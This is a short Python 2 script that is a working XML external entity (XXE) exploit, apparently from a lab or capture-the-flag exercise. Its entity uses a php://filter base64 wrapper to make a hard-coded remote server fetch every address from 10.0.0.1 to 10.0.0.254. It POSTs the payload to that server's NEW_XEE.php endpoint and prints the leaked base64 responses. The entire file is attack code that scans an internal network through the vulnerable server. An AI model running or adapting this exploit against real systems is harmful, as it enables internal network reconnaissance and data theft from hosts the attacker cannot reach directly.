import requests
import base64

#Origtional XML that the server accepts
#<xml>
#    <stuff>user</stuff>
#</xml>


def build_xml(string):
	xml = """<?xml version="1.0" encoding="ISO-8859-1"?>"""
	xml = xml + "\r\n" + """<!DOCTYPE foo [ <!ELEMENT foo ANY >"""
	xml = xml + "\r\n" + """<!ENTITY xxe SYSTEM """ + '"' + string + '"' + """>]>"""
	xml = xml + "\r\n" + """<xml>"""
	xml = xml + "\r\n" + """    <stuff>&xxe;</stuff>"""
	xml = xml + "\r\n" + """</xml>"""
	send_xml(xml)

def send_xml(xml):
	headers = {'Content-Type': 'application/xml'}
	x = requests.post('http://34.200.157.128/CUSTOM/NEW_XEE.php', data=xml, headers=headers, timeout=5).text
	coded_string = x.split(' ')[-2] # a little split to get only the base64 encoded value
	print coded_string
#	print base64.b64decode(coded_string)
for i in range(1, 255):
	try:
		i = str(i)
		ip = '10.0.0.' + i
		string = 'php://filter/convert.base64-encode/resource=http://' + ip + '/'
		print string
		build_xml(string)
	except:
		continue
